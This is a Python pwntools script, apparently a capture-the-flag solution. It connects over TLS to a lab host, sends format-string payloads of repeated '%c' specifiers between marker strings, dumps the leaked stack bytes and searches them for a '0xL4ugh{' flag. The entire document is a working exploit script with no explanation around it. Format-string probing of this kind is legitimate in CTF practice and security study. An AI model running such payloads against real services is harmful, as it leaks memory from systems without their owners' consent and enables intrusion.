#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'warn'

for num in [90, 100, 110, 115]:
    print(f"\n=== Trying {num} %%c ===")
    try:
        r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)
        r.recvuntil(b"Clue: ")
        leak = r.recvline()
        r.recvuntil(b"Write your path:")
        
        payload = b"MARK>" + b"%c" * num + b"<MARK"
        r.sendline(payload)
        
        response = r.recvall(timeout=2)
        print(f"Length: {len(response)}")
        
        # Check for flag
        if b"0xL4ugh{" in response:
            idx = response.find(b"0xL4ugh{")
            end = response.find(b"}", idx)
            if end != -1:
                print(f"\n*** FOUND FLAG: {response[idx:end+1].decode()} ***\n")
                sys.exit(0)
        
        # Check if we got good output
        if b"MARK>" in response and b"<MARK" in response:
            start = response.find(b"MARK>") + 5
            end = response.find(b"<MARK")
            data = response[start:end]
            print(f"Dumped {len(data)} bytes between markers")
            # Check for interesting strings
            if len(data) > 10:
                print(f"Sample: {data[:100]}")
        elif b"malformed" in response:
            print("Hit validator!")
        
        r.close()
    except Exception as e:
        print(f"Error: {e}")

print("\nNo flag found in attempts")
